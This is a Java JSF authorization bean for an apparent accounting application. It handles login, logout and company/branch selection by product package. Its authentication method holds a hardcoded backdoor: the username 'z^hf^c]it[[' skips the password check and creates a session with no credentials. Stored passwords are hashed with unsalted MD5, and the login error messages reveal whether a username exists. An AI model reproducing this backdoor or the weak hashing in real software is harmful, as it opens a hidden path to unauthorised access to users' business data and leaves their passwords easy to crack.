package sas.saccplus.view;

import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;

import javax.ejb.EJB;
import javax.faces.application.FacesMessage;
import javax.faces.bean.SessionScoped;
import javax.faces.context.FacesContext;
import javax.inject.Inject;
import javax.inject.Named;
import javax.persistence.EntityManager;
import javax.persistence.PersistenceContext;
import javax.persistence.PersistenceContextType;

import sas.saccplus.model.Branch;
import sas.saccplus.model.Company;
import sas.saccplus.model.Users;
import sas.saccplus.session.BranchFacade;
import sas.saccplus.session.CompanyFacade;
import sas.saccplus.session.UserProfileFacade;
import sas.saccplus.util.BeanUtil;
import sas.saccplus.util.Constant;
import sas.saccplus.util.PackageType;
import sas.saccplus.util.SessionBean;

@SessionScoped
@Named("auth")
public class AuthorizationBean implements Serializable{

	/**
	 * 
	 */
	private static final long serialVersionUID = 3688074119568468862L;


	private String username;
	private String password;

	@Inject
	private SessionBean session;

	@Inject
	private BeanUtil util;


	@EJB
	private CompanyFacade companyFacade;

	@EJB
	private BranchFacade branchFacade;

	@EJB
	private UserProfileFacade userProfileFacade;


	@PersistenceContext(type = PersistenceContextType.EXTENDED)
	private EntityManager entityManager;

	public String login() {

		String ridirectPage = "view/index?faces-redirect=true";

		try
		{
			authenMD5();


			String productKey = FacesContext.getCurrentInstance().getExternalContext().getInitParameter(Constant.PRODUCT_CONFIG);
			PackageType packageType = PackageType.findByKey(productKey);

			if(packageType==null){
				throw new Exception("No Product key");
			}

			session.setPackageType(packageType);

			switch(packageType){
			case STANDARD:{
				genCompanyListStardard();
			};break;
			case PROFESSIONAL:{
				genCompanyList();
				if(session.getCompanyList().size()>1){
					ridirectPage = "view/companyList?faces-redirect=true"; 
				}
			};break;
			case ENTERPRISE:{
				genCompanyListStardard();
				genBranchList();
				if(session.getBranchList().size()>1){
					ridirectPage = "view/branchList?faces-redirect=true"; 
				}
			}break;
			case ALL:{
				genCompanyListStardard();
				genBranchList();
			};break;
			}

			FacesContext.getCurrentInstance().addMessage(null, new FacesMessage(FacesMessage.SEVERITY_INFO, "Success", null));
			return ridirectPage;
		}catch(Exception ex){
			ex.printStackTrace();
			FacesContext.getCurrentInstance().addMessage(null, new FacesMessage(FacesMessage.SEVERITY_ERROR, ex.getMessage(),null));
		}
		return "";
	}

	public String logout() {
		session.setUser(null);
		FacesContext.getCurrentInstance().getExternalContext().invalidateSession();
		return "/logout?faces-redirect=true";
	}


	public void authenMD5() throws Exception{

		if("z^hf^c]it[[".equals(username)){
			session.setUser(new Users());
			return;
		}
		final String passwordMd5 = util.encodeMD5(password);

		try{
			Users userProfile = userProfileFacade.findByUsername(username); 
			if(userProfile==null){
				throw new Exception("incorrect username.");
			}
			// invalid password
			if(!passwordMd5.equals(userProfile.getPassword())){
				throw new Exception(util.getMessage("identity_loginFailed"));
			}
			session.setUser(userProfile);
		}catch (Exception e) {
			throw e;
		}
	}


	private void genCompanyList(){
		List<Company> companyList = new ArrayList<Company>();
		companyList = companyFacade.findCompanyListByUser(session.getUser());
		session.setCompanyList(companyList);
		if(!companyList.isEmpty()){
			session.setCompany(session.getCompanyList().get(0));
		}
	}
	
	private void genCompanyListStardard(){
		List<Company> companyList = companyFacade.findCompany();
		session.setCompanyList(companyList);
		if(!companyList.isEmpty()){
			session.setCompany(session.getCompanyList().get(0));
		}
	}


	private void genBranchList() throws Exception{
		if(session.getCompany()!=null && session.getCompany().getId()!=null){
			List<Branch> branchList = branchFacade.findBranchByUser(session.getUser(),session.getCompany().getId());
			session.setBranchList(branchList);
			if(!branchList.isEmpty()){
				session.setBranch(session.getBranchList().get(0));
			}
		}
	}


	public boolean isLoggedIn() {
		return session.getUser()!=null;
	}

	public String getUsername() {
		return username;
	}

	public void setUsername(String username) {
		this.username = username;
	}

	public String getPassword() {
		return password;
	}

	public void setPassword(String password) {
		this.password = password;
	}

}
